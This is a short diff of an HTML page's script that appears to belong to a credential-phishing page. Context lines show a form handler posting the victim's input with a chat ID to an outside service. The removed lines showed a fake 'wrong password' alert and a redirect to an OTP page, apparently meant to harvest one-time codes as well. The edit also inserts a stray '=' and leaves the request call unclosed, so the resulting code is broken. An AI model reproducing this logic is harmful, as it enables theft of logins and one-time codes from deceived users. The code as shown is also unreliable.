@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+=<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -36,14 +36,7 @@ form.addEventListener('submit', function(e){
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-    })
-    .then(() => {
-        alert('wrong password');
-        // Redirect to OTP page after sending
-        window.location.href = 'otp.html';
-    })
-    .catch(err => console.error(err));
-});
+  
 </script>
 
 </body>
